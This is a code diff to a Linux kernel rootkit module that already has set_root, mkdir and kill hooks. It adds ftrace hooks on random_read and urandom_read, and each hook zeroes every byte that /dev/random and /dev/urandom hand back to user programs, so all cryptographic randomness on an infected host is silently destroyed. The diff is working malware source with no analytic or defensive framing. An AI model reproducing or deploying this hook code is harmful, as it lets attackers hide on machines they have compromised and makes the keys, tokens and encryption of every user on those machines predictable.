@@ -44,6 +44,83 @@ void set_root(void)
 }
 /**************************************************
  ************************************************ */
+static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
+{
+    int bytes_read, i;
+    long error;
+    char *kbuf = NULL;
+
+    /* Call the real random_read() */
+    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
+
+    /* Allocate a kernel buffer big enough to to hold everything */
+    kbuf = kzalloc(bytes_read, GFP_KERNEL);
+    
+    /* Copy the random bytes from the userspace buf */
+    error = copy_from_user(kbuf, buf, bytes_read);
+
+    /* Check for any errors in copying */
+    if(error)
+    {
+        printk(KERN_DEBUG "rootkit: %d bytes could not be copied into kbuf\n", error);
+        kfree(kbuf);
+        return bytes_read;
+    }
+
+    /* Fill kbuf with 0x00 */
+    for ( i = 0 ; i < bytes_read ; i++ )
+        kbuf[i] = 0x00;
+
+    /* Copy the rigged buffer back to userspace */
+    error = copy_to_user(buf, kbuf, bytes_read);
+    if(error)
+        printk(KERN_DEBUG "rootkit: %d bytes could not be copied back into buf\n", error);
+
+    /* Free the buffer before returning */
+    kfree(kbuf);
+    return bytes_read;
+}
+
+/*****************************************************************************
+ * ***************************************************************************/
+static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
+{
+    int bytes_read, i;
+    long error;
+    char *kbuf = NULL;
+
+    /* Call the real random_read() */
+    bytes_read = orig_random_read(file, buf, nbytes, ppos);
+
+    /* Allocate a kernel buffer big enough to to hold everything */
+    kbuf = kzalloc(bytes_read, GFP_KERNEL);
+    
+    /* Copy the random bytes from the userspace buf */
+    error = copy_from_user(kbuf, buf, bytes_read);
+
+    /* Check for any errors in copying */
+    if(error)
+    {
+        printk(KERN_DEBUG "rootkit: %d bytes could not be copied into kbuf\n", error);
+        kfree(kbuf);
+        return bytes_read;
+    }
+
+    /* Fill kbuf with 0x00 */
+    for ( i = 0 ; i < bytes_read ; i++ )
+        kbuf[i] = 0x00;
+
+    /* Copy the rigged buffer back to userspace */
+    error = copy_to_user(buf, kbuf, bytes_read);
+    if(error)
+        printk(KERN_DEBUG "rootkit: %d bytes could not be copied back into buf\n", error);
+
+    /* Free the buffer before returning */
+    kfree(kbuf);
+    return bytes_read;
+}
+/**************************************************
+ ************************************************ */
 asmlinkage int hook_mkdir(const struct pt_regs *regs)
 {
     char __user *pathname = (char *)regs->di;
@@ -96,6 +173,8 @@ asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
 static struct ftrace_hook hooks[] = {
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("random_read", hook_random_read, &orig_random_read),
+    HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
 };
 /**************************************************
  ************************************************ */
